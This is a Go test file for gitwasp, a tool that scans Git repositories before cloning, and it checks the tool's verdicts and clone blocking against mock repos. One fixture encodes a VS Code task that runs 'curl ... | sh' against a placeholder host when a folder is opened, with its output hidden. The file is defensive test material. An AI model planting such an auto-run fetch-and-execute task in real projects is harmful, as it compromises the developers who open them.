package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Jehudavd/gitwasp/internal/model"
)

func TestRunSafeRepo(t *testing.T) {
	safeDir := filepath.Join("..", "..", "testdata", "safe-repo")
	var stdout, stderr bytes.Buffer
	code := run([]string{"scan", "--no-color", safeDir}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("expected exit 0, got %d; stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	if !strings.Contains(stdout.String(), "VERDICT: SAFE") {
		t.Fatalf("expected VERDICT: SAFE in stdout, got:\n%s", stdout.String())
	}
}

func TestRunMaliciousRepoAndJSON(t *testing.T) {
	malDir := filepath.Join("..", "..", "testdata", "malicious-repo")

	var stdout, stderr bytes.Buffer
	code := run([]string{"scan", "--no-color", malDir}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected exit 2, got %d; stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	out := stdout.String()
	for _, want := range []string{"VERDICT: DANGER", "IDE-001", "AI-001", "PKG-001", "GIT-001", "OBF-001"} {
		if !strings.Contains(out, want) {
			t.Fatalf("expected %q in terminal output, got:\n%s", want, out)
		}
	}

	stdout.Reset()
	stderr.Reset()
	code = run([]string{"scan", malDir, "--json"}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected exit 2 for JSON scan, got %d; stderr=%s", code, stderr.String())
	}

	var parsed model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &parsed); err != nil {
		t.Fatalf("invalid JSON output: %v\n%s", err, stdout.String())
	}
	if parsed.Verdict != model.VerdictDanger || len(parsed.Findings) == 0 {
		t.Fatalf("unexpected JSON scan result: %+v", parsed)
	}
}

func TestRunVersionHelpAndUnsupportedHost(t *testing.T) {
	var stdout, stderr bytes.Buffer

	if code := run([]string{"version"}, &stdout, &stderr); code != 0 || !strings.Contains(stdout.String(), "gitwasp ") {
		t.Fatalf("version failed: code=%d out=%q err=%q", code, stdout.String(), stderr.String())
	}

	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"help"}, &stdout, &stderr); code != 0 || !strings.Contains(stdout.String(), "Usage:") {
		t.Fatalf("help failed: code=%d out=%q err=%q", code, stdout.String(), stderr.String())
	}

	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"scan", "https://gitlab.com/example/repo"}, &stdout, &stderr); code != 1 || !strings.Contains(stderr.String(), "unsupported remote host") {
		t.Fatalf("unsupported host failed: code=%d out=%q err=%q", code, stdout.String(), stderr.String())
	}
}

func newMockGitHubServer(t *testing.T) *httptest.Server {
	t.Helper()

	dangerTasks := base64.StdEncoding.EncodeToString([]byte(`{"tasks":[{"label":"trap","command":"curl -s https://payload.example.invalid/x | sh","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"never"}}]}`))
	warnPkg := base64.StdEncoding.EncodeToString([]byte(`{"name":"warn-pkg","scripts":{"postinstall":"node scripts/post.js"}}`))
	safePkg := base64.StdEncoding.EncodeToString([]byte(`{"name":"safe-pkg","scripts":{"test":"go test ./..."}}`))

	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch r.URL.Path {
		case "/repos/acme/danger", "/repos/acme/warn", "/repos/acme/safe":
			_ = json.NewEncoder(w).Encode(map[string]any{"default_branch": "main"})
		case "/repos/acme/danger/git/trees/main":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tree": []map[string]any{
					{"path": ".vscode/tasks.json", "type": "blob", "sha": "sha-danger", "size": 150},
				},
			})
		case "/repos/acme/warn/git/trees/main":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tree": []map[string]any{
					{"path": "package.json", "type": "blob", "sha": "sha-warn", "size": 80},
				},
			})
		case "/repos/acme/safe/git/trees/main":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tree": []map[string]any{
					{"path": "package.json", "type": "blob", "sha": "sha-safe", "size": 80},
				},
			})
		case "/repos/acme/danger/git/blobs/sha-danger":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": dangerTasks})
		case "/repos/acme/warn/git/blobs/sha-warn":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": warnPkg})
		case "/repos/acme/safe/git/blobs/sha-safe":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": safePkg})
		default:
			http.NotFound(w, r)
		}
	}))
}

func TestRunRemoteScanAndCloneFlows(t *testing.T) {
	srv := newMockGitHubServer(t)
	defer srv.Close()

	// 1. Remote scan on DANGER repo
	var stdout, stderr bytes.Buffer
	deps := cliDeps{
		apiBaseURL:  srv.URL,
		httpClient:  srv.Client(),
		checkGitVer: func(context.Context) (string, string) { return "2.56.1", "" },
	}
	code := runWithDeps([]string{"scan", "--no-color", "https://github.com/acme/danger"}, &stdout, &stderr, deps)
	if code != 2 || !strings.Contains(stdout.String(), "IDE-001") || !strings.Contains(stdout.String(), "Pre-Clone Remote Repository Security Audit") {
		t.Fatalf("remote danger scan unexpected: code=%d out=%s err=%s", code, stdout.String(), stderr.String())
	}

	// 2. Remote scan --json on SAFE repo
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"scan", "--json", "acme/safe"}, &stdout, &stderr, deps)
	if code != 0 {
		t.Fatalf("remote safe json scan failed: code=%d err=%s", code, stderr.String())
	}
	var res model.ScanResult
	if err := json.Unmarshal(stdout.Bytes(), &res); err != nil || res.Verdict != model.VerdictSafe {
		t.Fatalf("unexpected remote JSON result: err=%v res=%+v", err, res)
	}

	// 3. Clone blocked on DANGER
	cloneCalled := false
	deps.runClone = func(_ context.Context, _, _ string, _, _ io.Writer) error {
		cloneCalled = true
		return nil
	}
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--no-color", "https://github.com/acme/danger"}, &stdout, &stderr, deps)
	if code != 2 || cloneCalled || !strings.Contains(stderr.String(), "clone blocked") {
		t.Fatalf("expected clone block on DANGER: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}

	// 4. Clone --force on DANGER proceeds
	cloneCalled = false
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--force", "--no-color", "https://github.com/acme/danger", "out-dir"}, &stdout, &stderr, deps)
	if code != 0 || !cloneCalled {
		t.Fatalf("expected clone --force to proceed: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}

	// 5. Clone on WARN with 'n' aborts
	cloneCalled = false
	deps.stdin = strings.NewReader("n\n")
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--no-color", "acme/warn"}, &stdout, &stderr, deps)
	if code != 1 || cloneCalled || !strings.Contains(stderr.String(), "aborted") {
		t.Fatalf("expected WARN 'n' to abort: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}

	// 6. Clone on WARN with 'y' proceeds
	cloneCalled = false
	deps.stdin = strings.NewReader("y\n")
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--no-color", "acme/warn"}, &stdout, &stderr, deps)
	if code != 0 || !cloneCalled {
		t.Fatalf("expected WARN 'y' to proceed: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}

	// 7. Clone on WARN with --yes proceeds without prompt
	cloneCalled = false
	deps.stdin = strings.NewReader("")
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--yes", "--no-color", "acme/warn"}, &stdout, &stderr, deps)
	if code != 0 || !cloneCalled {
		t.Fatalf("expected WARN --yes to proceed: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}

	// 8. Clone on SAFE proceeds automatically and surfaces outdated git warning
	cloneCalled = false
	deps.checkGitVer = func(context.Context) (string, string) {
		return "2.44.0", "warning: local Git 2.44.0 is vulnerable to CVE-2024-32002"
	}
	stdout.Reset()
	stderr.Reset()
	code = runWithDeps([]string{"clone", "--no-color", "acme/safe"}, &stdout, &stderr, deps)
	if code != 0 || !cloneCalled || !strings.Contains(stderr.String(), "CVE-2024-32002") {
		t.Fatalf("expected SAFE clone with git warning: code=%d cloneCalled=%v err=%s", code, cloneCalled, stderr.String())
	}
}

func TestFormatVersion(t *testing.T) {
	origVer, origCommit, origDate := version, commit, date
	defer func() {
		version, commit, date = origVer, origCommit, origDate
	}()

	version, commit, date = "v0.1.0-dev", "none", "unknown"
	if got := formatVersion(); got != "gitwasp v0.1.0-dev" {
		t.Fatalf("default formatVersion() = %q, want %q", got, "gitwasp v0.1.0-dev")
	}

	version, commit, date = "v0.1.0", "abc1234", "2026-11-23"
	if got := formatVersion(); got != "gitwasp v0.1.0 (commit: abc1234, built: 2026-11-23)" {
		t.Fatalf("injected formatVersion() = %q", got)
	}
}
